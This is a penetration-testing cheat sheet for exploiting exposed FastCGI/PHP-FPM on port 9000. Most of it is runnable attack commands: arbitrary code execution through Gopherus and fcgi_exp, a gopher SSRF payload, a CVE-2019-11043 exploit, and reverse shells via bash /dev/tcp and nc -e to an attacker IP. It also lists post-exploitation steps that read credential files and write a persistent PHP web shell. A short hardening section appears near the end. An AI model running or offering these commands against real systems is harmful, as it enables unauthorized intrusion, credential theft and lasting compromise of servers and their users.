# FASTCGI / PHP-FPM ENUMERATION (Port 9000)

## SERVICE OVERVIEW
```
FastCGI / PHP-FPM is a FastCGI implementation for PHP
- Default port: 9000
- Binary protocol (not HTTP)
- Used by web servers (nginx, Apache) to execute PHP
- Should only listen on localhost
- Direct access = RCE vulnerability
- Also used for other FastCGI applications
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p9000 <IP>                             # Service/Version detection
nc -nv <IP> 9000                                 # Manual connection (binary data)
```

## FASTCGI/PHP-FPM DETECTION
```bash
# Detect PHP-FPM
nmap -sV -p9000 <IP>                             # May identify as "php-fpm"

# Check if FastCGI responds
# FastCGI uses binary protocol, so netcat won't show much
nc <IP> 9000
# (Type random data and see if connection closes - indicates FastCGI)

# Better detection with fcgi client
cgi-fcgi -bind -connect <IP>:9000
```

## CRITICAL SECURITY ISSUE
```
If PHP-FPM (port 9000) is accessible from network:
- This is a CRITICAL misconfiguration
- Should ONLY listen on 127.0.0.1
- Direct access allows arbitrary PHP code execution
- Equivalent to having a web shell
- Immediate RCE vulnerability
```

## ARBITRARY CODE EXECUTION
```bash
# If PHP-FPM is accessible, you can execute arbitrary PHP code!

# Method 1: Using Gopherus
git clone https://github.com/tarunkant/Gopherus
cd Gopherus
python2 gopherus.py --exploit fastcgi

# Enter PHP command to execute:
system('whoami');
# Gopherus generates a gopher URL

# Then use the payload:
curl -s 'gopher://<IP>:9000/...[generated_payload]...'

# Method 2: Using fcgi_exp
git clone https://github.com/w181496/FuckFastcgi
python FuckFastcgi/fcgi_exp.py <IP> 9000 /var/www/html/index.php "system('id');"

# Method 3: Manual FastCGI packet crafting (complex)
```

## EXPLOIT WITH METASPLOIT
```bash
msfconsole
use exploit/multi/http/php_fpm_rce               # PHP-FPM RCE (if exists)
set RHOSTS <IP>
set RPORT 9000
set LHOST <attacker_IP>
run
```

## REVERSE SHELL VIA PHP-FPM
```bash
# Execute reverse shell via PHP-FPM

# Using Gopherus:
python2 gopherus.py --exploit fastcgi
# Enter:
system('bash -c "bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1"');

# Or using fcgi_exp:
python fcgi_exp.py <IP> 9000 /var/www/html/index.php "system('nc -e /bin/bash <attacker_IP> 4444');"

# Or direct reverse shell:
python fcgi_exp.py <IP> 9000 /var/www/html/index.php "system('bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1');"
```

## FCGI CLIENT TOOLS
```bash
# Install cgi-fcgi (libfcgi-bin)
apt-get install libfcgi-bin

# Using cgi-fcgi
SCRIPT_FILENAME=/var/www/html/index.php \
  SCRIPT_NAME=/index.php \
  REQUEST_METHOD=GET \
  cgi-fcgi -bind -connect <IP>:9000

# Execute PHP code with cgi-fcgi
SCRIPT_FILENAME=/var/www/html/index.php \
  REQUEST_METHOD=POST \
  PHP_VALUE="auto_prepend_file=/proc/self/fd/0" \
  cgi-fcgi -bind -connect <IP>:9000 << 'EOF'
<?php system('whoami'); ?>
EOF
```

## SSRF TO PHP-FPM
```bash
# If you have SSRF vulnerability on target, you can reach PHP-FPM

# Using Gopher protocol in SSRF:
# 1. Generate FastCGI payload with Gopherus
# 2. URL encode it
# 3. Use in SSRF: http://vulnerable.site/ssrf?url=gopher://127.0.0.1:9000/[payload]

# Example:
curl "http://vulnerable.site/fetch?url=gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00..."
```

## BYPASS RESTRICTIONS
```bash
# PHP-FPM often restricts which PHP files can be executed
# Common restrictions in php-fpm.conf:
# security.limit_extensions = .php

# Try different PHP file paths:
/var/www/html/index.php                          # Common location
/usr/share/nginx/html/index.php                  # Nginx default
/var/www/index.php                               # Alternative
/app/index.php                                   # Docker common
/index.php                                       # Root

# If .php restriction, try:
/etc/passwd                                      # May work if restrictions bypassed
/proc/self/cmdline                               # Process info
```

## READ FILES VIA PHP-FPM
```bash
# Even if code execution blocked, might read files

# Using auto_prepend_file to read files:
SCRIPT_FILENAME=/etc/passwd \
  REQUEST_METHOD=GET \
  cgi-fcgi -bind -connect <IP>:9000

# Or using fcgi exploit tools
python fcgi_exp.py <IP> 9000 /etc/passwd "readfile('/etc/passwd');"
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/http/php_fpm_detector      # Detect PHP-FPM (if exists)
set RHOSTS <IP>
set RPORT 9000
run

# Note: Limited Metasploit modules for PHP-FPM
# Mostly requires manual exploitation
```

## NMAP SCRIPTS
```bash
# FastCGI detection
nmap -sV -p9000 <IP>

# Custom Nmap script (if available)
nmap -p9000 --script fastcgi-* <IP>
```

## COMMON MISCONFIGURATIONS
```
☐ Listening on 0.0.0.0 instead of 127.0.0.1     # CRITICAL - RCE
☐ Accessible from internet                       # Should be localhost only
☐ No firewall rules                              # External access possible
☐ security.limit_extensions not set              # Can execute any file type
☐ Running as root                                # Privilege escalation
☐ No process isolation                           # Can affect other sites
☐ Default configuration                          # Insecure defaults
```

## VULNERABILITY SCANNING
```bash
# Search for FastCGI/PHP-FPM exploits
searchsploit fastcgi
searchsploit php-fpm

# Known issues:
# CVE-2019-11043: PHP-FPM RCE (nginx misconfiguration)
# Direct FastCGI access = design flaw, not CVE
```

## CVE-2019-11043 (PHP-FPM + NGINX)
```bash
# Path traversal + buffer underflow = RCE
# Requires specific nginx misconfiguration

# Test for vulnerability:
curl "http://<IP>/index.php%0a"

# Exploit:
git clone https://github.com/neex/phuip-fpizdam
go run main.go "http://<IP>/index.php"

# If vulnerable, gain RCE
```

## QUICK WIN CHECKLIST
```
☐ Check if port 9000 is accessible from network
☐ Test FastCGI protocol response
☐ Try arbitrary code execution (system, exec)
☐ Attempt reverse shell
☐ Test different PHP file paths
☐ Try file read via PHP-FPM
☐ Check for CVE-2019-11043 (if nginx)
☐ Look for SSRF to reach PHP-FPM
☐ Test Gopher protocol exploitation
```

## ONE-LINER FULL ENUMERATION
```bash
# Comprehensive FastCGI scan
nmap -sV -p9000 <IP>

# Quick RCE test with fcgi_exp
python fcgi_exp.py <IP> 9000 /var/www/html/index.php "system('id');"

# Test with Gopherus
python2 gopherus.py --exploit fastcgi
```

## POST-EXPLOITATION (After RCE)
```bash
# 1. Establish reverse shell
python fcgi_exp.py <IP> 9000 /var/www/html/index.php "system('bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1');"

# 2. Enumerate system
system('whoami');
system('id');
system('uname -a');
system('cat /etc/passwd');

# 3. Find web root and configuration
system('cat /etc/nginx/nginx.conf');
system('cat /etc/php/7.4/fpm/pool.d/www.conf');

# 4. Extract credentials
system('cat /var/www/html/config.php');
system('find /var/www -name "*.php" -exec grep -l "password" {} \;');

# 5. Establish persistence
system('echo "<?php system($_GET[cmd]); ?>" > /var/www/html/shell.php');

# 6. Privilege escalation
system('find / -perm -4000 2>/dev/null');       # SUID binaries
system('sudo -l');                              # Sudo permissions
```

## DETECTION & PREVENTION
```bash
# Secure PHP-FPM configuration:

# 1. Bind to localhost ONLY
# Edit /etc/php/7.4/fpm/pool.d/www.conf:
listen = 127.0.0.1:9000
# NOT: listen = 9000 (binds to all interfaces!)

# 2. Use Unix socket instead (more secure)
listen = /var/run/php/php7.4-fpm.sock

# 3. Restrict file extensions
security.limit_extensions = .php

# 4. Set proper permissions
chown root:root /etc/php/7.4/fpm/pool.d/www.conf
chmod 644 /etc/php/7.4/fpm/pool.d/www.conf

# 5. Firewall rules (defense in depth)
iptables -A INPUT -p tcp --dport 9000 ! -s 127.0.0.1 -j DROP

# 6. Check current configuration
netstat -tulpn | grep 9000
ss -tulpn | grep 9000

# Should show:
# 127.0.0.1:9000 (good - localhost only)
# 0.0.0.0:9000 (BAD - exposed to network!)
```

## COMMON PHP-FPM LOCATIONS
```bash
# Configuration files
/etc/php/7.4/fpm/php-fpm.conf                    # Main config
/etc/php/7.4/fpm/pool.d/www.conf                 # Pool config
/etc/php-fpm.conf                                # Alternative location
/etc/php-fpm.d/www.conf                          # Alternative pool

# Socket locations (if using Unix socket)
/var/run/php/php7.4-fpm.sock
/run/php/php-fpm.sock
/tmp/php-fpm.sock

# Log files
/var/log/php7.4-fpm.log
/var/log/php-fpm/error.log
```

## SECURITY IMPLICATIONS
```
CRITICAL RISKS:
1. Direct access to PHP-FPM = immediate RCE
2. Can execute arbitrary PHP/system commands
3. Full web application compromise
4. File system access
5. Database credentials accessible
6. Potential privilege escalation to root
7. Lateral movement to other services
8. No authentication required
9. Binary protocol - hard to detect/log

RECOMMENDATION:
- NEVER expose PHP-FPM to network
- Bind to 127.0.0.1 ONLY
- Use Unix sockets instead of TCP
- Implement firewall rules
- Restrict file extensions
- Run as unprivileged user
- Monitor for external connections
- Regular security audits
- Consider using AppArmor/SELinux

If found during pentest: CRITICAL severity finding!
```

## PHP-FPM VS OTHER CGI
```
PHP-FPM:
- FastCGI implementation for PHP
- Port 9000 by default
- Binary protocol
- Persistent process pool

CGI:
- Older protocol
- Spawns new process per request
- Slower than FastCGI

FastCGI (general):
- Language-agnostic
- Can be used for Python, Ruby, etc.
- More efficient than CGI

WSGI/ASGI:
- Python-specific alternatives
- Different architecture
```

## TOOLS FOR EXPLOITATION
```bash
# Gopherus - Generate Gopher payloads
git clone https://github.com/tarunkant/Gopherus

# FuckFastcgi - Direct FastCGI exploitation
git clone https://github.com/w181496/FuckFastcgi

# phuip-fpizdam - CVE-2019-11043 exploit
git clone https://github.com/neex/phuip-fpizdam

# cgi-fcgi - FastCGI client
apt-get install libfcgi-bin
```
